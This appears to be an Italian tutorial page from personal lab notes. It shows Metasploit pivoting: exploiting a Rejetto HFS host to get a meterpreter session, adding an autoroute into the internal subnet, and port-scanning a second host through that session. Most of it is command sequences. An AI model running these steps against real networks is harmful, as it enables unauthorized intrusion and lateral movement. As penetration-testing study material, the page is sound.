# Pivoting

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

una volta exploitato e avuto accesso a Victim 1 possiamo fare pivoting verso la rete interna a cui appartiene Victim 1, che ci permette di raggiungere Victim 2.

Utilizziamo la sessione meterrpeter su Victim 1 per accedere a Victim 2, passando effettivamente per Victim 1 altrimenti da Attacker non riusciremmo a raggiungere Victim 2.

## Test di accesso alle due vittime per comprendere il contesto

<figure><img src="../../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>

Possiamo vedere che riusciamo a raggiungere Victim 1:

<figure><img src="../../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>

Se proviamo ad accedere a Victim 2 direttamente non riusciamo:

<figure><img src="../../../.gitbook/assets/image (1201).png" alt=""><figcaption></figcaption></figure>

## Exploitiamo la prima vittima (Victim 1)

```
service postgresql start && msfconsole
workspace -a pivoting
db_nmap -sV 10.2.27.1 //Victim1
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS 10.2.27.1 //Victim1
exploit
```

<figure><img src="../../../.gitbook/assets/image (1202).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1203).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1205).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1204).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1206).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1207).png" alt=""><figcaption></figcaption></figure>

## Facciamo pivoting verso Victim2

Listiamo le interfacce di rete di Victim1 e individuiamo qual è la rete interna sulla quale si trova Victim 2

```
//Listiamo le interfacce di rete di Victim1 e individuiamo qual è la rete interna sulla quale si trova Victim 2
ipconfig
run autoroute -s 10.2.27.0/20 //impostiamo l'autoroute sulla rete a cui appartiene l'IP di Victim1, che è la stessa rete di Victim2
//ora possiamo accedere a questa sottorete via msfconsole attraverso la sessione meterpreter che lasciamo attiva su Victim1
background
sessions
sessions -n victim-1 -i 1 //rinominiamo la sessione per non confonderci
sessions
```

<figure><img src="../../../.gitbook/assets/image (1208).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1210).png" alt=""><figcaption></figcaption></figure>

## Enumeriamo Victim2

{% hint style="warning" %}
Attenzione: non possiamo usare nmap o strumenti esterni per scannerizzare la sottorete perché il routing funziona solo con Metasploit Framework ed i suoi moduli
{% endhint %}

```
//Usiamo portscan module per scannerizzare la rete che abbiamo aggiunto con autoroute
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.2.27.107 //Victim2
set PORTS 1-100 //per risparmiare un po' di tempo limitiamo le porte, a piacimento
exploit

```

<figure><img src="../../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>

Se tentiamo di accedere via browser vediamo che effettivamente Victim2 non è raggiungibile, perché il routing funziona solo in msfconsole.

Se vogliamo fare un nmap scan ad esempio, avremo bisogno di impostare un port forwarding nella sessione meterpreter di Victim1.
